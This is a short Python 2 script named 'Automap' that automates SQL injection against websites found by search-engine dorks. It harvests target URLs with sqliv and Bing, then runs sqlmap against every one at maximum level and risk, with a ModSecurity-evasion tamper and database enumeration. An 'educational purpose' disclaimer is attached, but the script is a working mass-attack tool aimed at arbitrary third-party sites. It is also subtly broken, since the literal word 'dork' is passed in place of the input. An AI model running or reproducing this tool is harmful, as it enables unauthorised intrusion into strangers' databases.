#!/usr/bin/env python

import os

import sys

import pexpect

print "Automap is a google dork sqlinjection automation tool, only for educational purpose. By Kwaku Ananse www.ansec.io" 
print "Do not attempt to violate the law with anything contained here. If this is your intention, then LEAVE NOW! "

# Input google dork or any word to seach for websites 

dork = raw_input('Dork or Word:')

os.system ('git clone https://github.com/sqlmapproject/sqlmap.git')
os.system("python ~/control/sqliv/sqliv.py -d dork -e bing -p 200 -o ~/control/result && awk -F'\"' '{ for(i=1; i<=NF; i++) { if($i ~ /^http/) print $i } }' ~/control/result > ~/control/result1 && python ~/control/sqlmap/sqlmap.py -m ~/control/result1 --random-agent --threads=4 --level=3 --risk=3 --batch --no-cast --timeout=15 --time-sec=15 -v 2 --delay=1 --tamper=modsecurityversioned --dbs")